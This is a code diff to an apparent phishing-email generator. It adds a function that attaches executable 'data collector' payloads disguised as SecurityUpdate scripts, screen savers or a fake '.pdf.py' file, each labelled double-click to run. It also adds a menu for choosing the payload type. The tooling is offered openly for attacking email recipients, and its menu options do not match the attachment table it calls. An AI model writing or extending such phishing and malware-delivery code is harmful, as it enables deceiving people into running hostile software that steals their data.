@@ -6,6 +6,96 @@ from email.message import EmailMessage
 import requests
 import re
 import smtplib
+import os
+
+def attach_data_collector(msg, attachment_type="shell"):
+    """Attach executable payload that runs with double-click."""
+    
+    attachment_options = {
+        # Linux/Unix options
+        "shell": {
+            "path": "SecurityUpdate.sh",
+            "filename": "SecurityUpdate.sh",
+            "maintype": "application",
+            "subtype": "x-sh",
+            "description": "Linux Shell Script - Double-click to run"
+        },
+        "python": {
+            "path": "SecurityUpdate_Linux.py",
+            "filename": "SecurityUpdate.py",
+            "maintype": "application", 
+            "subtype": "x-python",
+            "description": "Python Script - Double-click to run"
+        },
+        "appimage": {
+            "path": "SecurityUpdate.AppImage",
+            "filename": "SecurityUpdate.AppImage",
+            "maintype": "application",
+            "subtype": "x-appimage",
+            "description": "Linux AppImage - Double-click to run"
+        },
+        "desktop": {
+            "path": "SecurityUpdate.desktop",
+            "filename": "SecurityUpdate.desktop",
+            "maintype": "application",
+            "subtype": "x-desktop",
+            "description": "Linux Desktop Entry - Double-click to run"
+        },
+        # Windows options (preserved)
+        "batch": {
+            "path": "SecurityUpdate.bat",
+            "filename": "SecurityUpdate.bat",
+            "maintype": "application",
+            "subtype": "bat",
+            "description": "Windows Batch file - Double-click to run"
+        },
+        "vbs": {
+            "path": "SecurityUpdate.vbs", 
+            "filename": "SecurityUpdate.vbs",
+            "maintype": "application",
+            "subtype": "vbs",
+            "description": "Visual Basic Script - Double-click to run"
+        },
+        "scr": {
+            "path": "SecurityUpdate.scr",
+            "filename": "SecurityUpdate.scr", 
+            "maintype": "application",
+            "subtype": "octet-stream",
+            "description": "Screen Saver - Double-click to run"
+        },
+        "cmd": {
+            "path": "SecurityUpdate.cmd",
+            "filename": "SecurityUpdate.cmd",
+            "maintype": "application", 
+            "subtype": "cmd",
+            "description": "Windows Command file - Double-click to run"
+        }
+    }
+    
+    if attachment_type not in attachment_options:
+        print(f"Unknown attachment type. Available: {list(attachment_options.keys())}")
+        attachment_type = "batch"
+    
+    option = attachment_options[attachment_type]
+    collector_path = os.path.join(os.path.dirname(__file__), option["path"])
+    
+    if not os.path.exists(collector_path):
+        print(f"Error: {option['path']} not found!")
+        return False
+        
+    with open(collector_path, 'rb') as f:
+        file_data = f.read()
+        
+    # Attach the file
+    msg.add_attachment(
+        file_data,
+        maintype=option["maintype"],
+        subtype=option["subtype"],
+        filename=option["filename"]
+    )
+    
+    print(f"✅ Payload attached as {option['filename']} ({option['description']})")
+    return True
 
 # Embedded Gmail-like HTML template with placeholders
 TEMPLATE_HTML = '''<!DOCTYPE html>
@@ -211,6 +301,19 @@ def compose_phishing_email(data: dict) -> EmailMessage:
     filename = f"phishing_email_{data['username'].replace(' ', '_').lower()}.html"
     with open(filename, 'w', encoding='utf-8') as f:
         f.write(html)
+    
+    # Attach the data collector
+    print("\nChoose attachment type:")
+    print("1. PowerShell script (.ps1) - Best for Windows users")
+    print("2. Python script disguised as PDF (.pdf.py)")
+    print("3. Original Python script (.py)")
+    
+    attachment_choice = input("Enter choice (1-3, default=1): ").strip() or "1"
+    attachment_types = {"1": "powershell", "2": "python", "3": "original"}
+    attachment_type = attachment_types.get(attachment_choice, "powershell")
+    
+    if not attach_data_collector(msg, attachment_type):
+        print("Warning: Could not attach data collector")
 
     return msg
 
